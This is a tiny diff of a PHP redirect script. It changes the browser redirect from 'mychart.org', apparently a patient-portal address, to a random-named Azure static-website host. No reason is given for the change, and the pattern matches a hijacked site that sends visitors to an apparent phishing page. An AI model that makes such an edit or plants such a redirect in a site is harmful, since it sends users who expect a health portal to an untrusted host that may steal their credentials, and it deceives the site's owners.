@@ -2,7 +2,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://mychart.org/");
+header("Location: https://dwqewfda.z5.web.core.windows.net/");
  
 exit;
 ?>
